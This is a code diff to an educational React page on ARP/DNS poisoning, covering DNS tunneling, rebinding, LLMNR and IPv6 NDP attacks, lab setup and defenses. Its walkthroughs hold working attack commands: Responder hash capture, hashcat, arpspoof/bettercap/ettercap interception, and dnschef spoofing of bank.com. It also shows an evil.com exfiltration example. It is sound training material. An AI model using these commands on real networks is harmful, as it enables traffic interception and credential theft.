+                      { name: "Quad9", primary: "9.9.9.9", secondary: "149.112.112.112" },
+                      { name: "OpenDNS", primary: "208.67.222.222", secondary: "208.67.220.220" },
+                    ].map((dns) => (
+                      <Grid item xs={6} key={dns.name}>
+                        <Paper sx={{ p: 1, bgcolor: alpha("#22c55e", 0.02), borderRadius: 1 }}>
+                          <Typography variant="caption" sx={{ fontWeight: 700 }}>{dns.name}</Typography>
+                          <Typography variant="caption" display="block" sx={{ fontFamily: "monospace", fontSize: "0.7rem" }}>
+                            {dns.primary} / {dns.secondary}
+                          </Typography>
+                        </Paper>
+                      </Grid>
+                    ))}
+                  </Grid>
                 </Grid>
               </Grid>
 
@@ -1820,6 +2259,38 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 <WarningIcon sx={{ color: "#f59e0b" }} />
                 DNS Attack Techniques
               </Typography>
+
+              {/* Attack Surface Overview */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, border: `2px solid ${alpha("#f59e0b", 0.2)}` }}>
+                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
+                  🎯 Understanding the DNS Attack Surface
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  DNS attacks can happen at <strong>seven different points</strong> in the resolution process. Understanding 
+                  where attacks occur helps you defend against them:
+                </Typography>
+                <Grid container spacing={2}>
+                  {[
+                    { step: "1", location: "Your Computer", attack: "Hosts file modification, malware", icon: "💻" },
+                    { step: "2", location: "Local Network", attack: "ARP spoofing + DNS redirect, DHCP attacks", icon: "🏠" },
+                    { step: "3", location: "ISP Resolver", attack: "Cache poisoning, BGP hijacking", icon: "🏢" },
+                    { step: "4", location: "Internet Transit", attack: "BGP hijacking, route manipulation", icon: "🌐" },
+                    { step: "5", location: "TLD Servers", attack: "DDoS, registrar compromise", icon: "🏛️" },
+                    { step: "6", location: "Authoritative NS", attack: "Zone transfer, registrar hijacking", icon: "📋" },
+                    { step: "7", location: "Application", attack: "DNS rebinding, subdomain takeover", icon: "📱" },
+                  ].map((item) => (
+                    <Grid item xs={6} sm={4} md={12/7} key={item.step}>
+                      <Box sx={{ textAlign: "center", p: 1 }}>
+                        <Typography sx={{ fontSize: "1.5rem" }}>{item.icon}</Typography>
+                        <Typography variant="caption" sx={{ fontWeight: 700 }}>{item.step}. {item.location}</Typography>
+                        <Typography variant="caption" display="block" color="text.secondary" sx={{ fontSize: "0.65rem" }}>
+                          {item.attack}
+                        </Typography>
+                      </Box>
+                    </Grid>
+                  ))}
+                </Grid>
+              </Paper>
 
               <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                 DNS attacks exploit weaknesses in the domain name resolution system to redirect users, exfiltrate data,
@@ -1880,11 +2351,543 @@ const ArpDnsPoisoningPage: React.FC = () => {
                 </Grid>
               </Paper>
 
+              {/* DNS Tunneling Explained */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+                  🕳️ DNS Tunneling: The Covert Channel
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  DNS tunneling encodes data in DNS queries and responses to bypass firewalls. Since most firewalls 
+                  allow DNS (port 53), attackers use it to exfiltrate data or establish command-and-control channels.
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>How Data is Hidden</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1 }}>
+                      <Typography variant="caption" color="text.secondary" display="block">Legitimate query:</Typography>
+                      <Typography sx={{ fontFamily: "monospace" }}>www.example.com</Typography>
+                      <Typography variant="caption" color="text.secondary" display="block" sx={{ mt: 1 }}>Tunneled data (Base64 encoded):</Typography>
+                      <Typography sx={{ fontFamily: "monospace", color: "#ef4444" }}>c3RvbGVuLXBhc3N3b3Jk.evil.com</Typography>
+                      <Typography variant="caption" display="block" sx={{ mt: 1 }}>
+                        ↑ "stolen-password" encoded in subdomain
+                      </Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Detection Indicators</Typography>
+                    <List dense>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• High volume of DNS queries" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Unusual TXT record requests" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Long, random-looking subdomains" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Queries to newly registered domains" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• High entropy in domain names" /></ListItem>
+                    </List>
+                  </Grid>
+                </Grid>
+                <Alert severity="info" sx={{ mt: 2 }}>
+                  <Typography variant="body2">
+                    <strong>Tools:</strong> iodine, dnscat2, dns2tcp are popular DNS tunneling tools used in red team engagements.
+                  </Typography>
+                </Alert>
+              </Paper>
+
+              {/* DNS Rebinding Attack */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
+                  🔁 DNS Rebinding: Bypassing Same-Origin Policy
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  DNS rebinding is a sophisticated attack that bypasses the browser's same-origin policy. The attacker 
+                  controls a domain that initially resolves to their server, then "rebinds" to an internal IP address, 
+                  allowing JavaScript to interact with internal services.
+                </Typography>
+                <Box sx={{ mb: 2 }}>
+                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Attack Timeline</Typography>
+                  <Grid container spacing={1}>
+                    {[
+                      { step: "1", desc: "Victim visits attacker.com (resolves to 1.2.3.4)", color: "#22c55e" },
+                      { step: "2", desc: "JavaScript loaded from attacker's server", color: "#22c55e" },
+                      { step: "3", desc: "Attacker's DNS TTL expires (set very low)", color: "#f59e0b" },
+                      { step: "4", desc: "attacker.com now resolves to 192.168.1.1 (internal router)", color: "#ef4444" },
+                      { step: "5", desc: "Same-origin: JavaScript can now access internal router!", color: "#ef4444" },
+                    ].map((item) => (
+                      <Grid item xs={12} key={item.step}>
+                        <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
+                          <Box sx={{ width: 24, height: 24, borderRadius: "50%", bgcolor: alpha(item.color, 0.2), display: "flex", alignItems: "center", justifyContent: "center" }}>
+                            <Typography variant="caption" sx={{ fontWeight: 700, color: item.color }}>{item.step}</Typography>
+                          </Box>
+                          <Typography variant="body2">{item.desc}</Typography>
+                        </Box>
+                      </Grid>
+                    ))}
+                  </Grid>
+                </Box>
+                <Alert severity="warning">
+                  <Typography variant="body2">
+                    <strong>Defense:</strong> DNS rebinding defenses include DNS pinning, validating Host headers, 
+                    and using firewalls that block DNS responses pointing to internal IPs.
+                  </Typography>
+                </Alert>
+              </Paper>
+
+              {/* Windows-Specific: LLMNR/NBT-NS/mDNS */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#0078d4", 0.05), borderRadius: 2, border: `1px solid ${alpha("#0078d4", 0.2)}` }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0078d4" }}>
+                  🪟 LLMNR/NBT-NS/mDNS Poisoning (Windows Networks)
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  When DNS fails to resolve a hostname, Windows falls back to <strong>LLMNR</strong> (Link-Local Multicast Name Resolution) 
+                  and <strong>NBT-NS</strong> (NetBIOS Name Service). Attackers on the local network can respond to these broadcasts 
+                  and capture NTLMv2 hashes.
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>LLMNR</Typography>
+                      <Typography variant="caption" display="block">UDP 5355</Typography>
+                      <Typography variant="caption" color="text.secondary">IPv6 & IPv4 multicast</Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>NBT-NS</Typography>
+                      <Typography variant="caption" display="block">UDP 137</Typography>
+                      <Typography variant="caption" color="text.secondary">Legacy NetBIOS broadcasts</Typography>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Box sx={{ textAlign: "center", p: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>mDNS</Typography>
+                      <Typography variant="caption" display="block">UDP 5353</Typography>
+                      <Typography variant="caption" color="text.secondary">Bonjour/Avahi services</Typography>
+                    </Box>
+                  </Grid>
+                </Grid>
+                <CodeBlock
+                  language="bash"
+                  code={`# Attack with Responder (Kali)
+sudo responder -I eth0 -wrf
+
+# Captured hashes can be cracked with hashcat
+hashcat -m 5600 hashes.txt wordlist.txt
+
+# Disable via Group Policy
+Computer Config → Admin Templates → Network → DNS Client
+  → Turn off multicast name resolution → Enabled`}
+                />
+                <Alert severity="error" sx={{ mt: 2 }}>
+                  <Typography variant="body2">
+                    <strong>High Risk:</strong> This is one of the most common attacks in internal pentests. 
+                    Disable LLMNR and NBT-NS via Group Policy immediately if not needed!
+                  </Typography>
+                </Alert>
+              </Paper>
+
               <Alert severity="error" sx={{ mb: 3 }}>
                 <AlertTitle>High-Impact Attack</AlertTitle>
                 A successful DNS cache poisoning attack against a major resolver can affect millions of users,
                 redirecting them to phishing sites or malware distribution points without any indication of compromise.
               </Alert>
+            </Paper>
+
+            {/* ==================== IPv6 NDP ATTACKS ==================== */}
+            <Paper id="ipv6-ndp" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
+              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
+                <DevicesIcon sx={{ color: "#8b5cf6" }} />
+                IPv6 NDP Attacks (Modern ARP Spoofing)
+              </Typography>
+
+              <Alert severity="info" sx={{ mb: 3 }}>
+                <AlertTitle>Why This Matters</AlertTitle>
+                IPv6 is becoming more common. NDP (Neighbor Discovery Protocol) replaces ARP in IPv6 networks, 
+                but has similar vulnerabilities. Security professionals must understand both.
+              </Alert>
+
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+                  🔄 ARP vs NDP: Same Problem, New Protocol
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>IPv4 ARP</Typography>
+                    <List dense>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Broadcasts ARP Request" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Uses MAC address FF:FF:FF:FF:FF:FF" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• No authentication" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Cache poisoning via gratuitous ARP" /></ListItem>
+                    </List>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>IPv6 NDP</Typography>
+                    <List dense>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Multicasts Neighbor Solicitation" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Uses ICMPv6 messages" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• SEND (optional authentication) rarely used" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Cache poisoning via NA/RA spoofing" /></ListItem>
+                    </List>
+                  </Grid>
+                </Grid>
+              </Paper>
+
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>NDP Message Types & Attack Vectors</Typography>
+              <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 3 }}>
+                <Table size="small">
+                  <TableHead>
+                    <TableRow sx={{ bgcolor: alpha("#8b5cf6", 0.1) }}>
+                      <TableCell sx={{ fontWeight: 700 }}>Message Type</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>ICMPv6 Type</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>Attack Potential</TableCell>
+                    </TableRow>
+                  </TableHead>
+                  <TableBody>
+                    {[
+                      { msg: "Router Solicitation (RS)", type: "133", purpose: "Host asks for router info", attack: "Trigger rogue RA responses" },
+                      { msg: "Router Advertisement (RA)", type: "134", purpose: "Router announces itself", attack: "Rogue RA - redirect default gateway" },
+                      { msg: "Neighbor Solicitation (NS)", type: "135", purpose: "Like ARP Request", attack: "DoS via NS flood" },
+                      { msg: "Neighbor Advertisement (NA)", type: "136", purpose: "Like ARP Reply", attack: "Spoofed NA - MITM attacks" },
+                      { msg: "Redirect", type: "137", purpose: "Better route notification", attack: "Traffic redirection" },
+                    ].map((row) => (
+                      <TableRow key={row.msg}>
+                        <TableCell sx={{ fontWeight: 600 }}>{row.msg}</TableCell>
+                        <TableCell>{row.type}</TableCell>
+                        <TableCell>{row.purpose}</TableCell>
+                        <TableCell sx={{ color: "#ef4444" }}>{row.attack}</TableCell>
+                      </TableRow>
+                    ))}
+                  </TableBody>
+                </Table>
+              </TableContainer>
+
+              <Grid container spacing={3}>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
+                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
+                      🚨 Rogue Router Advertisement Attack
+                    </Typography>
+                    <Typography variant="body2" sx={{ mb: 2 }}>
+                      The most dangerous IPv6 attack. An attacker sends fake Router Advertisements claiming to be 
+                      the default gateway. All hosts automatically configure to use the attacker as their router.
+                    </Typography>
+                    <Typography variant="body2" sx={{ fontWeight: 600 }}>Impact:</Typography>
+                    <List dense>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Full MITM position" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Can advertise malicious DNS servers" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Affects all hosts on the segment" /></ListItem>
+                    </List>
+                  </Paper>
+                </Grid>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
+                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>
+                      🛡️ IPv6 NDP Defense: RA Guard
+                    </Typography>
+                    <Typography variant="body2" sx={{ mb: 2 }}>
+                      RA Guard is a switch feature that blocks Router Advertisements from unauthorized ports.
+                      Only designated router ports are allowed to send RAs.
+                    </Typography>
+                    <Typography variant="body2" sx={{ fontWeight: 600 }}>Cisco Configuration:</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1, mt: 1 }}>
+                      ipv6 nd raguard policy BLOCK_RA<br />
+                      &nbsp;&nbsp;device-role host<br />
+                      interface GigabitEthernet0/1<br />
+                      &nbsp;&nbsp;ipv6 nd raguard attach-policy BLOCK_RA
+                    </Box>
+                  </Paper>
+                </Grid>
+              </Grid>
+            </Paper>
+
+            {/* ==================== LAB SETUP ==================== */}
+            <Paper id="lab-setup" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
+              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
+                <SettingsIcon sx={{ color: "#22c55e" }} />
+                Safe Lab Environment Setup
+              </Typography>
+
+              <Alert severity="warning" sx={{ mb: 3 }}>
+                <AlertTitle>⚠️ Legal Warning</AlertTitle>
+                <Typography variant="body2">
+                  Performing ARP/DNS attacks on networks without explicit written authorization is <strong>illegal</strong> and 
+                  can result in criminal charges. Always practice in isolated lab environments only.
+                </Typography>
+              </Alert>
+
+              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
+                To safely learn and practice these techniques, set up an isolated virtual lab environment. 
+                Here are recommended approaches:
+              </Typography>
+
+              <Grid container spacing={3}>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, height: "100%" }}>
+                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+                      🖥️ Virtual Lab Option 1: VirtualBox/VMware
+                    </Typography>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Required VMs:</Typography>
+                    <List dense>
+                      <ListItem>
+                        <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>1</Typography></ListItemIcon>
+                        <ListItemText primary="Kali Linux" secondary="Attacker machine with pre-installed tools" />
+                      </ListItem>
+                      <ListItem>
+                        <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>2</Typography></ListItemIcon>
+                        <ListItemText primary="Windows 10/11" secondary="Victim machine for testing" />
+                      </ListItem>
+                      <ListItem>
+                        <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>3</Typography></ListItemIcon>
+                        <ListItemText primary="pfSense/OPNsense" secondary="Router/firewall for realistic setup" />
+                      </ListItem>
+                    </List>
+                    <Alert severity="info" sx={{ mt: 2 }}>
+                      Set all VMs to "Internal Network" or "Host-Only" to isolate from real networks.
+                    </Alert>
+                  </Paper>
+                </Grid>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2, height: "100%" }}>
+                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
+                      🐳 Virtual Lab Option 2: Docker Compose
+                    </Typography>
+                    <Typography variant="body2" sx={{ mb: 2 }}>
+                      Lighter alternative using containers. Create an isolated Docker network:
+                    </Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1, overflow: "auto" }}>
+                      {`# Create isolated network
+docker network create --driver bridge \\
+  --subnet=192.168.100.0/24 lab_network
+
+# Run containers
+docker run -d --name attacker \\
+  --network lab_network kalilinux/kali-rolling
+
+docker run -d --name victim \\
+  --network lab_network ubuntu:22.04`}
+                    </Box>
+                  </Paper>
+                </Grid>
+              </Grid>
+
+              <Box sx={{ mt: 4 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Pre-Installed Lab Environments</Typography>
+                <Grid container spacing={2}>
+                  {[
+                    { name: "DVWA", desc: "Damn Vulnerable Web App - web attack practice", link: "https://dvwa.co.uk/" },
+                    { name: "Metasploitable", desc: "Intentionally vulnerable Linux VM", link: "https://sourceforge.net/projects/metasploitable/" },
+                    { name: "VulnHub", desc: "Collection of vulnerable VMs", link: "https://www.vulnhub.com/" },
+                    { name: "HackTheBox", desc: "Online penetration testing labs", link: "https://www.hackthebox.com/" },
+                    { name: "TryHackMe", desc: "Guided cybersecurity training", link: "https://tryhackme.com/" },
+                    { name: "PentesterLab", desc: "Web security exercises", link: "https://pentesterlab.com/" },
+                  ].map((env, idx) => (
+                    <Grid item xs={12} sm={6} md={4} key={idx}>
+                      <Paper sx={{ p: 2, borderRadius: 2, height: "100%", border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{env.name}</Typography>
+                        <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{env.desc}</Typography>
+                        <Typography variant="caption" sx={{ color: accent, wordBreak: "break-all" }}>{env.link}</Typography>
+                      </Paper>
+                    </Grid>
+                  ))}
+                </Grid>
+              </Box>
+
+              <Box sx={{ mt: 4 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Essential Tools for Learning</Typography>
+                <TableContainer component={Paper} sx={{ borderRadius: 2 }}>
+                  <Table size="small">
+                    <TableHead>
+                      <TableRow sx={{ bgcolor: alpha("#22c55e", 0.1) }}>
+                        <TableCell sx={{ fontWeight: 700 }}>Tool</TableCell>
+                        <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
+                        <TableCell sx={{ fontWeight: 700 }}>Install Command (Kali)</TableCell>
+                      </TableRow>
+                    </TableHead>
+                    <TableBody>
+                      {[
+                        { tool: "Wireshark", purpose: "Packet capture and analysis", cmd: "apt install wireshark" },
+                        { tool: "arpwatch", purpose: "Monitor ARP activity", cmd: "apt install arpwatch" },
+                        { tool: "dsniff", purpose: "Network auditing tools (arpspoof)", cmd: "apt install dsniff" },
+                        { tool: "ettercap", purpose: "MITM attack framework", cmd: "apt install ettercap-graphical" },
+                        { tool: "bettercap", purpose: "Modern network attack tool", cmd: "apt install bettercap" },
+                        { tool: "mitmproxy", purpose: "Interactive HTTPS proxy", cmd: "apt install mitmproxy" },
+                        { tool: "dnschef", purpose: "DNS proxy for manipulation", cmd: "apt install dnschef" },
+                        { tool: "responder", purpose: "LLMNR/NBT-NS/mDNS poisoner", cmd: "apt install responder" },
+                      ].map((row) => (
+                        <TableRow key={row.tool}>
+                          <TableCell sx={{ fontWeight: 600, color: "#22c55e" }}>{row.tool}</TableCell>
+                          <TableCell>{row.purpose}</TableCell>
+                          <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{row.cmd}</TableCell>
+                        </TableRow>
+                      ))}
+                    </TableBody>
+                  </Table>
+                </TableContainer>
+              </Box>
+            </Paper>
+
+            {/* ==================== ATTACK SCENARIOS ==================== */}
+            <Paper id="attack-scenarios" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#f59e0b", 0.1)}` }}>
+              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
+                <PsychologyIcon sx={{ color: "#f59e0b" }} />
+                Attack Scenarios (Educational Walkthrough)
+              </Typography>
+
+              <Alert severity="error" sx={{ mb: 3 }}>
+                <AlertTitle>🚨 FOR EDUCATIONAL PURPOSES IN LAB ENVIRONMENTS ONLY</AlertTitle>
+                These walkthroughs are for understanding attack mechanics to build better defenses. 
+                Never use these techniques on networks you don't own.
+              </Alert>
+
+              {/* Scenario 1 */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
+                  📌 Scenario 1: Classic ARP MITM Attack
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2 }}>
+                  <strong>Situation:</strong> Attacker wants to intercept traffic between a victim (192.168.1.100) 
+                  and the gateway (192.168.1.1) on the same network.
+                </Typography>
+                
+                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Step-by-Step Process:</Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>1. Enable IP Forwarding</Typography>
+                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
+                        Without this, intercepted packets are dropped causing DoS instead of MITM.
+                      </Typography>
+                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
+                        # Linux<br />
+                        echo 1 {">"} /proc/sys/net/ipv4/ip_forward<br /><br />
+                        # Or permanently in sysctl.conf<br />
+                        net.ipv4.ip_forward = 1
+                      </Box>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>2. Discover Network</Typography>
+                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
+                        Identify targets and gateway IP/MAC addresses.
+                      </Typography>
+                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
+                        # Find your gateway<br />
+                        ip route | grep default<br /><br />
+                        # Discover hosts<br />
+                        nmap -sn 192.168.1.0/24<br /><br />
+                        # View current ARP cache<br />
+                        arp -a
+                      </Box>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>3. Execute ARP Spoofing</Typography>
+                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
+                        Poison both victim and gateway ARP caches.
+                      </Typography>
+                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
+                        # Using arpspoof (run in 2 terminals)<br />
+                        arpspoof -i eth0 -t 192.168.1.100 192.168.1.1<br />
+                        arpspoof -i eth0 -t 192.168.1.1 192.168.1.100<br /><br />
+                        # Or using bettercap<br />
+                        bettercap -iface eth0<br />
+                        {">"} net.probe on<br />
+                        {">"} set arp.spoof.targets 192.168.1.100<br />
+                        {">"} arp.spoof on
+                      </Box>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>4. Capture Traffic</Typography>
+                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
+                        Now all traffic flows through attacker. Capture and analyze.
+                      </Typography>
+                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
+                        # Capture with Wireshark<br />
+                        wireshark -i eth0 -k<br /><br />
+                        # Or tcpdump<br />
+                        tcpdump -i eth0 -w capture.pcap<br /><br />
+                        # Capture HTTP credentials<br />
+                        ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
+                      </Box>
+                    </Paper>
+                  </Grid>
+                </Grid>
+              </Paper>
+
+              {/* Scenario 2 */}
+              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
+                  📌 Scenario 2: DNS Spoofing with ARP MITM
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2 }}>
+                  <strong>Situation:</strong> After establishing MITM position, attacker wants to redirect 
+                  specific website traffic to a fake server.
+                </Typography>
+                
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Using dnschef:</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1 }}>
+                      {`# Create fake DNS entries file
+echo "bank.com=192.168.1.50" > dns_hosts.txt
+
+# Run dnschef
+dnschef --fakeip 192.168.1.50 \\
+  --fakedomains bank.com,*.bank.com \\
+  --interface 0.0.0.0 --port 53
+
+# Configure iptables to redirect DNS
+iptables -t nat -A PREROUTING \\
+  -p udp --dport 53 -j REDIRECT --to-port 53`}
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Using bettercap (all-in-one):</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1 }}>
+                      {`# Start bettercap
+bettercap -iface eth0
+
+# In bettercap console:
+> set dns.spoof.domains bank.com,*.bank.com
+> set dns.spoof.address 192.168.1.50
+> dns.spoof on
+
+# Combined with ARP spoofing:
+> set arp.spoof.targets 192.168.1.100
+> arp.spoof on
+> dns.spoof on`}
+                    </Box>
+                  </Grid>
+                </Grid>
+              </Paper>
+
+              {/* What defenders learn */}
+              <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+                  🛡️ What Defenders Learn From These Scenarios
+                </Typography>
+                <Grid container spacing={2}>
+                  {[
+                    { lesson: "ARP spoofing requires local network access", defense: "Use VLANs to segment networks and limit attack surface" },
+                    { lesson: "IP forwarding must be enabled for MITM", defense: "Detect unusual gateway behavior with monitoring" },
+                    { lesson: "Both victim AND gateway must be poisoned", defense: "Static ARP entries on critical servers prevent one side" },
+                    { lesson: "DNS spoofing works alongside ARP MITM", defense: "Use encrypted DNS (DoH/DoT) to bypass local manipulation" },
+                    { lesson: "Attacks need to be continuous", defense: "Frequent ARP changes trigger DAI alerts" },
+                  ].map((item, idx) => (
+                    <Grid item xs={12} md={6} key={idx}>
+                      <Box sx={{ display: "flex", gap: 1 }}>
